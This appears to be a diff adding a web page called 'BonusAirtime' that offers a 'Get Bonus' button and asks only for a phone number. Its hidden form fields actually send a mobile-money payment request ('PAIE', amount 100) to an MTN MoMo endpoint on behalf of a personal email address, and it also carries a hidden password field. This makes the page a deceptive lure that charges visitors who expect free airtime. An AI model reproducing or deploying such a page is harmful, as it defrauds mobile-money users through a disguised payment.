@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>BonusAirtime</title>
+    <link rel="manifest" href="./site.webmanifest" />
+    <link
+      rel="apple-touch-icon"
+      sizes="180x180"
+      href="./apple-touch-icon.png"
+    />
+    <link
+      rel="icon"
+      type="image/png"
+      sizes="32x32"
+      href="./favicon-32x32.png"
+    />
+    <link
+      rel="icon"
+      type="image/png"
+      sizes="16x16"
+      href="./favicon-16x16.png"
+    />
+    <link rel="manifest" href="./site.webmanifest" />
+    <link rel="mask-icon" href="./safari-pinned-tab.svg" color="#5bbad5" />
+    <meta name="msapplication-TileColor" content="#da532c" />
+    <meta name="theme-color" content="#ffffff" />
+    <link
+      rel="stylesheet"
+      href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
+      integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"
+      crossorigin="anonymous"
+    />
+  </head>
+
+  <body class="container-fluid">
+    <div class="row">
+      <div class="col">
+        <h1 class="text-center m-5 text-warning">BonusAirtime</h1>
+        <form
+          id="formmomo"
+          method="GET"
+          action="https://developer.mtn.cm/OnlineMomoWeb/faces/transaction/transactionRequest.xhtml"
+          target="_top"
+          class="mx-2"
+        >
+          <input type="hidden" name="idbouton" value="2" autocomplete="off" />
+          <input
+            type="hidden"
+            name="typebouton"
+            value="PAIE"
+            autocomplete="off"
+          />
+          <input
+            class="momo mount form-control form-control-lg"
+            type="hidden"
+            placeholder="amount"
+            name="_amount"
+            value="100"
+            id="montant"
+            autocomplete="off"
+          />
+          <div class="form-group">
+            <label for="phone-number" class="h5">Phone Number</label>
+            <input
+              class="momo host form-control form-control-lg mt-2 border-warning"
+              type="number"
+              placeholder=""
+              name="_tel"
+              value=""
+              autocomplete="off"
+              id="phone-number"
+            />
+          </div>
+          <input
+            class="momo pwd"
+            placeholder="Please enter your password"
+            name="_clP"
+            value=""
+            autocomplete="off"
+            type="hidden"
+          />
+          <input
+            type="hidden"
+            name="_email"
+            value="nsedrick101@gmail.com"
+            autocomplete="off"
+          />
+          <button
+            type="image"
+            id="Button_Image"
+            name="submit"
+            alt="OnloneMomo, le réflexe sécurité pour payer en ligne"
+            autocomplete="off"
+            class="btn btn-lg btn-warning rounded-pill text-white px-5 py-2 mt-2"
+          >
+            Get Bonus
+          </button>
+        </form>
+
+        <script src="./app-script.js"></script>
+      </div>
+    </div>
+  </body>
+</html>
